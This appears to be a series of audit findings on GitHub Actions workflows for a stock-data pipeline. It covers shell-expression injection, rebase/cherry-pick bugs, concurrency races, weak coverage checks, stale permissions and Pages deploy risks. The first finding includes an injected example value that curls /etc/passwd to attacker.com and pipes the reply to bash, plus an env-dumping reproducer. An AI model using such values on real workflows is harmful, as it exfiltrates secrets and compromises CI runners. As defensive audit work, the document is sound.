findings.title: inputs.max directly interpolated into shell — workflow_dispatch code injection
findings.description: The `Pull SEC XBRL` step interpolates `${{ inputs.max }}` directly into the shell command via a GitHub expression: `node pull-sec-xbrl.js --max ${{ inputs.max }}`. GitHub expression interpolation happens BEFORE the shell executes, so the final shell line becomes a literal string containing whatever the `max` input contains. Any user with write access to the repo who triggers `workflow_dispatch` can supply a value like `0; curl attacker.com/$(cat /etc/passwd) | bash` and execute arbitrary commands on the runner with full access to repo secrets (GITHUB_TOKEN, DISCORD_WEBHOOK, FINNHUB_API_KEY).
findings.mechanism: GitHub evaluates `${{ inputs.max }}` at YAML-template time and splices the raw string into the shell script. The runner then passes the composite string verbatim to bash. No quoting or sanitisation is applied. This is the standard TOCTOU pattern for expression injection in GitHub Actions documented in GitHub's security hardening guide.
findings.reproducer: Trigger workflow_dispatch with max = `0; env | base64`. The runner logs will contain all environment variables including GITHUB_TOKEN and any other secrets bound in the job.
findings.impact: Full runner compromise: secrets exfiltration (GITHUB_TOKEN, DISCORD_WEBHOOK, FINNHUB_API_KEY), arbitrary code execution on ubuntu-latest, ability to push malicious commits to main via the exfiltrated GITHUB_TOKEN.
findings.suggested_fix: Use an env var intermediary and validate numeric input: add `env: MAX_INPUT: ${{ inputs.max }}` to the step, then in the shell: `max=${MAX_INPUT:-0}; if ! [[ "$max" =~ ^[0-9]+$ ]]; then echo '::error::max must be a non-negative integer'; exit 1; fi; if [ "$max" -gt 0 ]; then node pull-sec-xbrl.js --max "$max"; else node pull-sec-xbrl.js; fi`. The env var path is not subject to shell metacharacter injection because the shell receives the value as an environment variable binding, not as inline tokens.
findings.compound_hint: F-CI-006 (Verify SEC Coverage only warns, never hard-fails) — an attacker-driven pull with max=1 would be silently accepted.

findings.title: Cherry-pick-back loop fires spuriously after second-iteration rebase, risking conflict on cherry-pick
findings.description: The retry-rebase push loop captures `COMMIT_SHA=$(git rev-parse HEAD)` BEFORE the first rebase (line 569). A successful `git rebase --autostash origin/main` rewrites the local commit, producing a NEW sha. On the next loop iteration (after a push failure), `git rev-list HEAD | grep -q "^${COMMIT_SHA}$"` scans history for the PRE-REBASE sha. Since the rebase rewrote it, the original sha is NOT in `git rev-list HEAD`. The condition `! git rev-list HEAD | grep -q "^${COMMIT_SHA}$"` is TRUE — so the code executes `git reset --hard origin/main && git cherry-pick "$COMMIT_SHA"`. But `$COMMIT_SHA` is the pre-rebase sha, which now exists only as a dangling object (not reachable from any branch). `git cherry-pick` on a dangling commit SHA can succeed (cherry-pick applies the diff, not the sha), but if origin/main has since received a conflicting commit, this cherry-pick will produce a conflict and the step exits with `exit 1` — unnecessarily blocking the commit of a day's worth of snapshots that was never actually lost.
findings.mechanism: Push attempt 1: rebase succeeds (COMMIT_SHA rewritten to new_sha) → push fails (network/non-fast-forward) → loop iteration 2 → git fetch → rebase again (no-op if no new remote commits) → SHA check: COMMIT_SHA (pre-rebase) not in rev-list → cherry-pick fired despite data being intact. If cherry-pick encounters a conflict → exit 1 → day's snapshots committed to main never (Commit step exits non-zero → Notify fires with 'Yahoo-Pull failed' message).
findings.reproducer: Simulate a push failure on attempt 1 by temporarily revoking the GITHUB_TOKEN write permission mid-run, then restoring it. The second attempt will trigger the spurious cherry-pick path.
findings.impact: On any run where push fails on attempt 1 but would succeed on attempt 2, the cherry-pick path can generate a merge conflict that exits the step with code 1, discarding the day's snapshot commit. The pipeline reports failure but the root cause is the cherry-pick logic, not a real data problem.
findings.suggested_fix: Update `COMMIT_SHA` after each successful rebase: move the SHA capture inside the loop, AFTER the `git rebase` succeeds. Replace the `git rev-list HEAD | grep -q` check with `git merge-base --is-ancestor "$COMMIT_SHA" HEAD 2>/dev/null` which is O(1) and correctly handles the case where the sha has been rebased (it returns false only if the commit is genuinely missing, not if it was simply rewritten). Better: after each successful rebase, do `COMMIT_SHA=$(git rev-parse HEAD)` to track the current HEAD sha.
findings.compound_hint: F-CI-003 (rev-list O(n) performance) — both bugs are in the same code block.

findings.title: `git rev-list HEAD` is O(repo-history) — runs up to 6 times per push retry across both workflows
findings.description: `git rev-list HEAD | grep -q "^${COMMIT_SHA}$"` (daily-pull line 589; identical pattern in monthly-sec-xbrl line 103) traverses the ENTIRE reachable commit graph from HEAD and pipes all SHAs to grep. With `fetch-depth: 0`, the full repo history is fetched, which for a daily-commit repo running since ~2023 is 700+ commits (at minimum). Each commit line is 41 bytes; 700 commits = ~29 KB. This is called in a retry loop of up to 3 iterations in both workflows, and up to 6 total on the 1st of the month. While unlikely to OOM, it wastes wall time and is semantically incorrect (see F-CI-002 — the sha being 'not found' is actually the normal post-rebase state, not an error).
findings.mechanism: git rev-list HEAD enumerates all commits reachable from HEAD | grep scans the stream | grep exits 0 (found) or 1 (not found). On a repo with N commits, this is O(N) I/O. After a rebase, the original sha is unreachable from HEAD (it's a dangling object), so grep exits 1 every time — triggering the cherry-pick path on EVERY retry iteration.
findings.reproducer: Run `git rev-list HEAD | wc -l` in the screener-data repo to see the current commit count. Each push-retry iteration pays this cost.
findings.impact: Minor wall-time waste per run (~100ms at current repo size); more importantly, the O(N) traversal semantics are wrong for the post-rebase case (see F-CI-002), so it generates false cherry-pick triggers.
findings.suggested_fix: Replace with `git merge-base --is-ancestor "$COMMIT_SHA" HEAD` (O(1), correct semantics: true if sha is an ancestor of HEAD, false otherwise). After rebase, the pre-rebase sha is NOT an ancestor of HEAD, so the condition correctly fires. But combined with F-CI-002's fix (update COMMIT_SHA after each rebase), the post-rebase sha IS an ancestor and the check becomes a true safety net rather than a false trigger.
findings.compound_hint: F-CI-002 — fixing F-CI-002 also fixes the false trigger; fixing F-CI-003 alone improves correctness and performance.

findings.title: monthly-sec-xbrl workflow_dispatch always queues on main-push, blocking test runs for up to 240 min
findings.description: daily-pull.yml uses a conditional concurrency group (Tag 219a): scheduled runs use `main-push`, workflow_dispatch runs use `manual-{run_id}`. monthly-sec-xbrl.yml unconditionally uses `group: main-push` (line 22), including for workflow_dispatch test runs. On any day when a scheduled daily-pull is running or queued (every day of the week), a manually-dispatched monthly-sec-xbrl test will be queued behind the daily pull's `main-push` slot. With daily-pull's timeout at 240 minutes and cancel-in-progress: false, the test run waits up to 240 minutes. On GitHub's free plan, queued workflow runs can be evicted entirely after an extended wait, silently discarding the manually-triggered test run with no notification.
findings.mechanism: daily-pull (scheduled) holds `main-push` concurrency group → operator dispatches monthly-sec-xbrl for a test → monthly-sec-xbrl queues on `main-push` → waits up to 240 min → free-plan eviction may silently drop the queued run → operator sees no failure, just no output.
findings.reproducer: Manually trigger monthly-sec-xbrl while a daily-pull scheduled run is active. Observe the monthly run staying in 'queued' state until the daily completes.
findings.impact: Operator cannot test monthly-sec-xbrl in isolation. Manual SEC data re-pulls after discovery of a bug are blocked by the current day's scheduled pull. On the 1st of the month, a manual re-run after a partial failure is also blocked.
findings.suggested_fix: Mirror daily-pull's concurrency expression: `group: ${{ github.event_name == 'workflow_dispatch' && format('manual-{0}', github.run_id) || 'main-push' }}`. This lets test dispatches bypass the queue while keeping scheduled monthly runs serialized with scheduled daily runs on `main-push`.
findings.compound_hint: F-CI-005 (concurrency group + 1st-of-month race) — the asymmetry between workflows is the root cause of both issues.

findings.title: Manual daily-pull dispatch + scheduled monthly-sec-xbrl can push concurrently on the 1st of the month
findings.description: On the 1st of the month: (1) scheduled daily-pull fires at 02:00 UTC on `main-push`, (2) scheduled monthly-sec-xbrl fires at 08:00 UTC on `main-push` — these are serialized by the concurrency group. BUT: daily-pull.yml's Tag 219a change means a manual workflow_dispatch of daily-pull uses `manual-{run_id}` and bypasses the `main-push` group entirely. If an operator dispatches daily-pull manually while monthly-sec-xbrl is in its commit phase (which can happen any time on the 1st after 08:00 UTC), the manual daily-pull proceeds concurrently with monthly-sec-xbrl. Both run `git fetch origin main` + `git rebase` + `git push` in parallel. The push that lands second will have fetched a pre-push origin/main and will fail with 'non-fast-forward' on attempt 1. The retry loop fetches again, rebases again, and retries push. With the F-CI-002 cherry-pick bug, the second pusher may trigger a spurious cherry-pick if a conflict arises.
findings.mechanism: Manual daily-pull (group=manual-X) and scheduled monthly-sec-xbrl (group=main-push) run concurrently → both reach commit step → fetch/rebase/push race → one wins, one retries → on retry, F-CI-002 cherry-pick logic fires if the original COMMIT_SHA was rewritten by the rebase → possible exit 1.
findings.reproducer: Trigger workflow_dispatch on daily-pull while monthly-sec-xbrl is between its 'Pull SEC XBRL' and 'Commit manifest' steps on the 1st of the month.
findings.impact: Data loss probability is low (rebase handles most conflicts), but combined with F-CI-002 the retry path can fail and discard one of the two commits. The less-common case is a failed cherry-pick that exits the workflow non-zero, which at minimum causes a false-alarm 'Yahoo-Pull failed' Discord notification.
findings.suggested_fix: Simplest fix: give monthly-sec-xbrl the same workflow_dispatch escape hatch as daily-pull (see F-CI-004 fix). Both scheduled runs remain serialized on main-push; only manual dispatches bypass the queue and accept the push-race risk (which the retry loop handles).
findings.compound_hint: F-CI-002 (cherry-pick spurious trigger) — fixes to F-CI-002 reduce the blast radius of this race.

findings.title: Verify SEC Coverage never hard-fails — partial or empty SEC pull commits as authoritative manifest
findings.description: `Verify SEC Coverage` emits `::warning::` when `n_ok < 100` but never calls `exit 1`. There is no hard-fail path for any coverage level, including `n_ok = 0`. Additionally, when `_manifest.json` does not exist at all (e.g., `pull-sec-xbrl.js` crashed before writing it), the step emits `::warning::No SEC XBRL manifest found` and exits 0. In both cases the `Commit manifest` step runs and attempts `git add external-data/sec-xbrl/_manifest.json`. If the manifest is missing, `git add` silently stages nothing; if it's present but empty/partial, the partial manifest is committed. The next month's run will diff against this partial manifest and consider the partial coverage as the baseline, making future coverage degradation invisible.
findings.mechanism: pull-sec-xbrl.js crashes after writing 50 of 20,000 entries → manifest has n_ok=50, n_total=20000 → Verify SEC Coverage: 50 < 100 → ::warning:: emitted, exit 0 → Commit manifest: git add + git commit → partial manifest pushed to main → next month: baseline is 50, degradation not visible → downstream XBRL-backed fundamentals (valuation, Piotroski F-score, etc.) use stale data for 11 months until the next monthly run succeeds.
findings.reproducer: Block sec.gov in pull-sec-xbrl.js for one run. Observe ::warning:: in log, then the commit step successfully committing an empty/partial manifest.
findings.impact: Monthly SEC fundamentals data can silently degrade to a partial state and remain there until manually corrected. XBRL-backed metrics (Altman Z-score, Piotroski F-score, ROIC trend) will use stale fundamentals without any CI failure signal.
findings.suggested_fix: Add a hard-fail threshold: `if [ "$total" -gt 1000 ] && [ "$ok" -lt 500 ]; then echo '::error::SEC XBRL coverage $ok/$total is critically low — refusing to commit manifest'; exit 1; fi`. Also fail when the manifest file is missing: move the missing-manifest branch from `::warning::` to `exit 1`. Keep the `::warning::` for borderline cases (e.g., 80% of normal).
findings.compound_hint: F-CI-001 (inputs.max injection) — an attacker triggering a max=1 pull would only get a 1-ticker manifest, which passes the current warning-only gate.

findings.title: Pipeline Health Check failure silently blocks Pages deploy but emits no distinct notification
findings.description: `Pipeline Health Check` has no `continue-on-error: true`. When it fails, the `Deploy to GitHub Pages` step (with `if: success()`) is skipped — users see stale reports. However, the failure notification step at lines 660-671 uses `if: failure()` and fires a generic 'Yahoo-Pull failed' message that does not distinguish between (a) a health check failure (data was committed to main, only deploy was skipped) and (b) a genuine Yahoo pull failure (no data committed). An operator reading 'Yahoo-Pull failed' has no immediate way to know whether the day's snapshot data landed in main or not. The notification also only fires when DISCORD_WEBHOOK is set, so silent failures are possible if the secret is unset.
findings.mechanism: Pipeline Health Check exits 1 (e.g., one script exceeded 5% error threshold) → Deploy to GitHub Pages is skipped (if: success() = false) → 'Notify on failure' fires with 'Yahoo-Pull failed' → operator checks main branch, finds data was committed → diagnoses wrong script for the failure. Meanwhile, GitHub Pages still serves yesterday's reports.
findings.reproducer: Introduce a bug in one non-critical script that causes pipeline-health-check.js to report >5% errors. Observe that screener.html/modes-report.html on Pages are not updated even though main has fresh snapshots.
findings.impact: Users see stale screener reports; operator gets an ambiguous failure notification. The day's data is safe in git but unreachable via the public Pages URL until the next successful run.
findings.suggested_fix: Add `continue-on-error: true` to Pipeline Health Check (health is a diagnostic, not a gate for publishing already-committed data), and add an explicit `if: failure()` step that checks `steps.pipeline-health-check.conclusion == 'failure'` to emit a differentiated Discord alert: 'Health check failed — data committed to main but Pages not updated.'
findings.compound_hint: F-CI-008 (stale Pages comment/permissions) — the overall Pages deploy reliability is a compound concern.

findings.title: Stale `pages: write` + `id-token: write` permissions and stale comment referencing dropped --strategy-option theirs
findings.description: Two distinct stale/misleading metadata issues: (1) `permissions: pages: write, id-token: write` (lines 10-11) are the OAuth scopes required by the official `actions/upload-pages-artifact` + `actions/deploy-pages` API pathway. The Deploy to GitHub Pages step uses manual `git push --force origin gh-pages` with GITHUB_TOKEN embedded in the remote URL — it does NOT use the deploy-pages API. The `pages: write` and `id-token: write` permissions are dead weight that indicate an abandoned migration to the modern Pages API, and may confuse future maintainers into thinking the Pages API path is active. (2) Comment on line 611: 'The concurrency group (main-push) already prevents concurrent workflow pushes; this comment documents why --strategy-option theirs is safe here.' But --strategy-option theirs was explicitly dropped in Tag 232c-7 (line 574 comment) precisely BECAUSE it was unsafe. The comment is now factually wrong and actively misleading — a maintainer reading it would conclude theirs is acceptable here and might re-add it.
findings.mechanism: Stale permissions: OIDC token (`id-token: write`) is requested but never used — the job requests an OIDC token from GitHub's token issuer on every run, which is a minor security surface expansion with no benefit. Stale comment: directly contradicts the fix documented 30 lines above it.
findings.reproducer: Review the deployed workflow at the GitHub Actions UI — the job will show OIDC token acquisition in the runner logs even though no step uses the token.
findings.impact: Stale permissions expand the security surface unnecessarily. Stale comment misleads future maintainers. Low severity individually but together indicate comment/permission debt that could cause real harm when someone references them for a future change.
findings.suggested_fix: Remove `pages: write` and `id-token: write` from the permissions block (only `contents: write` is needed for the manual gh-pages push approach). Delete the stale comment on line 611, or replace it with: 'Note: --strategy-option theirs was dropped in Tag 232c-7; the retry loop handles conflicts via abort+cherry-pick instead.'
findings.compound_hint: F-CI-007 (Pages deploy reliability) — the overall Pages deployment strategy (manual git push vs. official deploy-pages API) is the root of both issues.

findings.title: Deploy to GitHub Pages destroys gh-pages history on every run — no rollback path for bad deploys
findings.description: The Deploy step creates a NEW orphan git repo in `_site/` (`git init -b gh-pages`) and force-pushes it to origin's gh-pages branch on every run. This means gh-pages always has exactly 1 commit in its history. If a deploy produces corrupted HTML (e.g., a generate-modes-report.js bug produces a malformed file, or a cp command copies a truncated file), there is no git history on gh-pages to revert to. The only recovery option is to find the prior deploy's content in the job artifacts (which default to 90-day retention) or to re-run a prior workflow run — both require manual operator action. There is no `git revert` available.
findings.mechanism: Every run: `git init -b gh-pages` (fresh orphan) → `git add -A` → `git commit` → `git push --force origin gh-pages` rewrites the branch. Previous deploy content is unreachable (orphan history, not in reflog of any branch). If the runner workspace has corrupted HTML, the push succeeds and the bad HTML is served immediately.
findings.reproducer: Inspect gh-pages branch: `git log origin/gh-pages --oneline` — it will always show exactly 1 commit.
findings.impact: A bad deploy (corrupted screener.html, truncated modes-report.html) immediately becomes the live site with no rollback path shorter than 'wait for the next run' or 'manually locate last good deploy artifact'.
findings.suggested_fix: Either (a) switch to `actions/upload-pages-artifact@v3` + `actions/deploy-pages@v4` (which maintains history and supports rollback via the Pages API), or (b) clone the existing gh-pages branch before the deploy and push incrementally: `git clone --branch gh-pages --depth 5 ... _site/ && cp new-files _site/ && cd _site && git add -A && git commit && git push`. This retains at least the last 5 deploys in gh-pages history.
findings.compound_hint: F-CI-008 (dead pages: write permission) — migrating to the official deploy-pages API path would fix both issues simultaneously.

findings.title: FINNHUB_API_KEY degradation is silently swallowed — universe growth stalls without any CI signal
findings.description: Refresh Universe sets `FINNHUB_API_KEY: ${{ secrets.FINNHUB_API_KEY }}` and warns if the var is empty (lines 119-121). But the warning is only printed when the shell variable is empty — i.e., when the secret is missing entirely. If the Finnhub API key is present but expired/invalid (HTTP 401 from Finnhub), `refresh-universe.js` exits non-zero, `continue-on-error: true` swallows the failure, and no warning is emitted. The existing watchlist (15,734 tickers) survives intact, so `Verify Watchlist Sanity` passes. New IPOs and newly-listed tickers are silently not discovered. Tag 227a raised MAX_UNIVERSE to 25,000 specifically to accommodate universe growth, but if the Finnhub key is invalid, that growth never occurs.
findings.mechanism: Finnhub key expires → refresh-universe.js exits 1 on HTTP 401 → continue-on-error swallows → Verify Watchlist Sanity: size=15734 >= 200 → PASS → pipeline continues normally. This can persist for months without any operator alert. The only observable symptom is universe size stagnating in the watchlist metadata, which is not checked.
findings.reproducer: Set FINNHUB_API_KEY to an expired/invalid token in repo secrets, dispatch daily-pull. No error visible in the run log — only the 'continue-on-error' yellow checkmark on the Refresh Universe step.
findings.impact: Universe growth silently stalls; Tag 227a's expansion headroom is never exercised; newly-IPO'd high-growth tickers never enter the screener.
findings.suggested_fix: Add a post-refresh check that compares `watchlist.stocks.length` against the value from the previous run (stored in watchlist metadata's `_meta.lastCount` or similar). Emit `::warning::` if universe shrunk or did not grow for 7+ consecutive days. Alternatively, check the exit code of refresh-universe.js and emit a differentiated warning: 'Refresh Universe exited non-zero — Finnhub key may be invalid or rate-limited.'

findings.title: No per-step timeout on Refresh Universe, Refresh FX-Rates, Compute Sector-Medians, Walk-Forward, or Method-Effectiveness
findings.description: Tag 232c-25 added per-step timeouts to Pull Earnings-Calendar (20 min) and Pull Historical Prices (25 min). However, the following network/compute-heavy steps have no per-step timeout: Refresh Universe (fetches from SEC EDGAR, Finnhub, OTC Markets, NASDAQ Screener API — could hang on any), Refresh FX-Rates (live Yahoo currency quotes), Compute Sector-Medians (reads all ~3300 snapshots), Walk-Forward Performance (reads prices + picks-history — O(tickers × vintages)), and Method-Effectiveness Audit. Each of these can hang on a network stall, lock, or infinite loop. With no per-step timeout, any one of them can consume the remaining job budget after Yahoo Pull finishes, causing the Commit Snapshots step to never run.
findings.mechanism: Refresh Universe hangs on a Finnhub HTTP connection that never closes (no socket timeout in the library) → step runs until job-level 240-min SIGKILL → Commit Snapshots never runs → day's Yahoo Pull results (already in ./snapshots/) are lost from the ephemeral runner workspace.
findings.reproducer: Introduce a `await new Promise(() => {})` (never-resolving promise) at the top of refresh-universe.js. The workflow will silently hang at that step until the 240-minute job budget is exhausted.
findings.impact: Any of the post-pull steps can silently consume the job budget and prevent committing the day's data. The probability is low but non-zero, particularly for Refresh Universe which calls four different external APIs.
findings.suggested_fix: Add per-step timeouts consistent with the Tag 232c-25 pattern: `timeout-minutes: 10` for Refresh Universe, `timeout-minutes: 5` for Refresh FX-Rates, `timeout-minutes: 15` for Walk-Forward Performance, `timeout-minutes: 10` for Method-Effectiveness Audit, `timeout-minutes: 10` for Compute Sector-Medians. All these steps already have `continue-on-error: true`, so a timeout is treated as a soft failure and the pipeline proceeds to commit.
findings.compound_hint: F-CI-007 (Pipeline Health Check failure blocks deploy) — a timed-out step + health check failure is the compound that loses both data commit AND pages update in the same run.

findings.title: Stale comment on line 611 says --strategy-option theirs is 'safe' after it was explicitly dropped as unsafe
findings.description: Line 611 reads: 'The concurrency group (main-push) already prevents concurrent workflow pushes; this comment documents why --strategy-option theirs is safe here.' This is factually wrong on two counts. (1) --strategy-option theirs was explicitly dropped in Tag 232c-7 (documented on lines 574-582 just 30 lines above), precisely because it was unsafe — 'theirs' in rebase semantics refers to the upstream branch, not the local branch, so it would silently discard the local commit's content on conflict. (2) With the Tag 219a workflow_dispatch escape hatch (line 22), concurrent pushes ARE now possible when a manual dispatch and a scheduled run overlap. This comment will mislead any future maintainer who reads it when debugging push behavior or considering whether to re-add a conflict-resolution strategy.
findings.mechanism: Maintainer reads stale comment → concludes theirs is safe → re-adds `--strategy-option theirs` to the rebase command → on next push conflict, local snapshot data is silently discarded (the exact bug Tag 232c-7 fixed). The comment actively undermines the Tag 232c-7 fix.
findings.impact: Low immediate impact (comment, not code). HIGH future impact if it causes a developer to re-introduce the theirs strategy option.
findings.suggested_fix: Replace the comment with: 'NOTE: --strategy-option theirs was dropped in Tag 232c-7 (see lines 574-582) because in rebase semantics it discards local changes on conflict. Conflicts are now handled via abort+cherry-pick. Also note: manual workflow_dispatch runs use a per-run concurrency group (Tag 219a) so concurrent pushes ARE possible — the retry loop handles them.'
findings.compound_hint: F-CI-005 (concurrency race) — the stale comment's incorrect claim that concurrent pushes are impossible is the same misconception that makes F-CI-005 non-obvious.
